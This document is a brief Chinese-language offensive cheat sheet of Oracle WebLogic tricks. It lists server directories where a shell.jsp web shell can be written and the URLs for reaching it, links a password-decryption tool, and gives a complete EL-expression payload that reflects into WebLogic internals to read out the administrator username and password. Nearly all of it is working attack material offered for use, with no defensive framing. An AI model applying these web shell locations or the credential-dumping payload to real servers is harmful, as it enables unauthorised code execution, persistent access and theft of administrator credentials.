## Weblogic trick

## 写文件rce

```
\server\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\shell.jsp
访问：\bea_wls_internal\shell.jsp


\server\wlserver\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp
访问：\console\framework\skins\wlsconsole\images\shell.jsp

\server\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\随机字符\war\shell.jsp
访问：\uddiexplorer\shell.jsp

\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\项目名\随机字符\war\shell.jsp

访问：\项目名\shell.jsp
```

### 获得用户密码

https://github.com/TideSec/Decrypt_Weblogic_Password

el表达式

```java
${pageContext.setAttribute("classLoader",Thread.currentThread().getContextClassLoader());pageContext.setAttribute("httpDataTransferHandler",pageContext.getAttribute("classLoader").loadClass("weblogic.deploy.service.datatransferhandlers.HttpDataTransferHandler"));pageContext.setAttribute("managementService", pageContext.getAttribute("classLoader").loadClass("weblogic.management.provider.ManagementService"));pageContext.setAttribute("authenticatedSubject",pageContext.getAttribute("classLoader").loadClass("weblogic.security.acl.internal.AuthenticatedSubject"));pageContext.setAttribute("propertyService",pageContext.getAttribute("classLoader").loadClass("weblogic.management.provider.PropertyService"));pageContext.setAttribute("KERNE_ID",pageContext.getAttribute("httpDataTransferHandler").getDeclaredField("KERNE_ID"));pageContext.getAttribute("KERNE_ID").setAccessible(true);pageContext.setAttribute("getPropertyService",managementService.getMethod("getPropertyService",pageContext.getAttribute("authenticatedSubject")));pageContext.getAttribute("getPropertyService").setAccessible(true);pageContext.setAttribute("prop",pageContext.getAttribute("getPropertyService").invoke(null,pageContext.getAttribute("KERNE_ID").get((null))));pageContext.setAttribute("getTimestamp1",propertyService.getMethod("getTimestamp1"));pageContext.getAttribute("getTimestamp1").setAccessible(true);pageContext.setAttribute("getTimestamp2",propertyService.getMethod("getTimestamp2"));pageContext.getAttribute("getTimestamp2").setAccessible(true);pageContext.setAttribute("username", pageContext.getAttribute("getTimestamp1").invoke(pageContext.getAttribute("prop")));pageContext.setAttribute("password",pageContext.getAttribute("getTimestamp2").invoke(pageContext.getAttribute("prop")));pageContext.getAttribute("username").concat("/").concat(pageContext.getAttribute("password"))}
```
